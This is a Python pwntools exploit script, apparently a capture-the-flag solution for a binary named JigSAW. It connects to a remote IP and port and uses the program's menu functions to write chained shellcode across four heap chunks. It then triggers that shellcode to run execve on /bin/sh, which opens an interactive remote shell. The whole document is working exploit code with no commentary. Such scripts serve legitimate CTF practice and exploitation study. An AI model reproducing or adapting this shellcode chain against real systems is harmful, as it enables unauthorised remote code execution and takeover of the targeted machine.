from pwn import *

context.arch = 'amd64'

p = remote('47.104.71.220','10273')
#p = process('./JigSAW')
elf = ELF('./JigSAW')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def Add(idx):
    p.sendlineafter('Choice : ',str(1))
    p.sendlineafter('Index? : ',str(idx))

def Edit(idx,con):
    p.sendlineafter('Choice : ',str(2))
    p.sendlineafter('Index? : ',str(idx))
    p.sendafter('iNput:',con)

def Delete(idx):
    p.sendlineafter('Choice : ',str(3))
    p.sendlineafter('Index? : ',str(idx))

def Test(idx):
    p.sendlineafter('Choice : ',str(4))
    p.sendlineafter('Index? : ',str(idx))

def Show(idx):
    p.sendlineafter('Choice : ',str(5))
    p.sendlineafter('Index? : ',str(idx))

def debug(addr):
    context.log_level = 'debug'
    gdb.attach(p,'b *'+str(0x555555554000+addr))
    pause()


#debug(0x1c41)
p.recvuntil('Name:')
p.send('A'*0x8)

p.recvuntil('Make your Choice:')
p.sendline(str(0x10000000000))

sc1 = asm('xor 	rsi, rsi')
sc1+= asm('push rsi')
sc1+= asm('add rdx, 0x20')
sc1+= asm('jmp rdx')

#0x68732f2f6e69622f
sc2 = asm('push rdx')
sc2+= asm('pop rdi')
sc2+= asm('add rdi, 0x40')
sc2+= asm('add rdx, 0x20')
sc2+= asm('jmp rdx')

sc3 = asm('mov 	al,	59')
sc3+= asm('xor rdx, rdx')
sc3+= asm('cdq')
sc3+= asm('syscall')

sc4 = '/bin/sh\x00'

Add(0)
Add(1)
Add(2)
Add(3)

Edit(0,sc1)
Edit(1,sc2)
Edit(2,sc3)
Edit(3,sc4)

Test(0)


p.interactive()

